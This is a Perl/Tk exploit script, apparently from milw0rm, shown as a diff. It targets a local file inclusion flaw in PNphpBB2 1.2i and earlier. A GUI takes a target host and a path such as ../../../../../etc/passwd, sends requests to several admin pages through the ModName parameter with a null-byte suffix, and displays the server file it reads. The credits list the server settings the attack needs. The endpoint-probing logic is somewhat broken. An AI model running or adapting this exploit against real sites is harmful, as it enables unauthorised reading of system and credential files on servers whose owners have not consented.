@@ -1,0 +1,149 @@
+#!/usr/bin/perl
+# PNphpBB2 <= 1.2i (ModName) Multiple LFI Exploit
+# by athos - staker[at]hotmail[dot]it
+
+use strict;
+use LWP::Simple;
+use Tk;
+
+my ($host,$file,$about);
+
+my $poc = "PNphpBB2 <= 1.2i (ModName) Multiple LFI Exploit";
+my $obj = new MainWindow(-background => '#E4E4E4');
+
+$obj->title($poc);
+$obj->minsize(500,200);
+$obj->maxsize(500,200);
+
+text('Host/Path (ex: http://localhost/cms)');
+input1();
+text('Local File (ex: ../../../../../etc/passwd');
+input2();
+button();
+Button();
+
+print $host;
+
+sub text {
+   
+   my $load = undef;
+   my $text = shift;
+   
+   $load = $obj->Label(
+                  -text  => $text,
+                  -font  => 'monospace 8',
+                  -foreground   => '#000000',
+                  -background   => '#E4E4E4',
+                )->pack(-anchor => 'n');
+   return $load;           
+}
+
+
+sub input1 {
+   
+   return $obj->Entry(
+                  -textvariable => \$host,
+                  -font         => 'monospace 8',
+                  -foreground   => '#000000',
+                  -background   => '#E4E4E4',
+                  )->pack(-anchor => 'n');
+   
+}
+
+
+sub input2 {
+   
+   return $obj->Entry(
+                  -textvariable => \$file,
+                  -font         => 'monospace 8',
+                  -foreground   => '#000000',
+                  -background   => '#E4E4E4',
+                  )->pack(-anchor => 'n');
+   
+}
+
+sub button {
+
+   return $obj->Button(
+                -text    => 'Exploit',
+                -font    => 'monospace 8',
+                -foreground   => '#000000',
+                -background   => '#E4E4E4',
+                -command => sub { exploit(); }
+               )->pack(-anchor => 'n');
+}
+
+sub Button {
+   
+   return $obj->Button(
+                -text    => 'Credits',
+                -font    => 'monospace 8',
+                -foreground   => '#000000',
+                -background   => '#E4E4E4',
+                -command => sub { about(); }
+               )->pack(-anchor => 'n');
+}
+
+sub exploit {
+   
+   my $enum = 0;
+   my @path = (
+             '/admin/admin_words.php?ModName=',
+             '/admin/admin_groups_reapir.php?ModName=',
+             '/admin/admin_smilies.php?ModName=',
+             '/admin/admin_ranks.php?ModName=',
+             '/admin/admin_styles.php?ModName=',
+             '/admin/admin_users.php?ModName=',
+           );  
+   
+   if(get($path[$enum]) =~ /no such file/i) {
+      $enum++;
+   }
+   else {
+      window(get($host.$path[$enum].$file.'%00'));
+   }            
+}
+
+
+sub window {
+   
+   my $A = shift;
+   my $T = new MainWindow(-background => '#E4E4E4');
+   
+   $T->title('Exploit Content');
+   
+   return $T->Label(
+              -text       => $A,
+              -font       => 'monospace 8',
+              -background => '#E4E4E4',
+              -foreground => '#000000',
+            )->pack(-anchor => 'n');  
+}            
+
+sub about {
+   
+   $about .= $poc;
+   $about .= "\nby athos - staker[at]hotmail[dot]it\r";
+   $about .= "\ndownload on http://www.pnphpbb.com\r";
+   $about .= "\nregister globals  = 1\r";
+   $about .= "\nmagic quotes gpc = 0\r\n";
+   
+   my $H = new MainWindow(-background => '#E4E4E4');
+   
+   $H->title('About');
+   $H->minsize(500,200);
+   $H->maxsize(500,200);
+   
+   return $H->Label(
+              -text       => $about,
+              -font       => 'monospace 8',
+              -background => '#E4E4E4',
+              -foreground => '#000000',
+            )->pack(-anchor => 'n');
+}
+
+
+
+MainLoop;
+
+# milw0rm.com [2009-01-04]
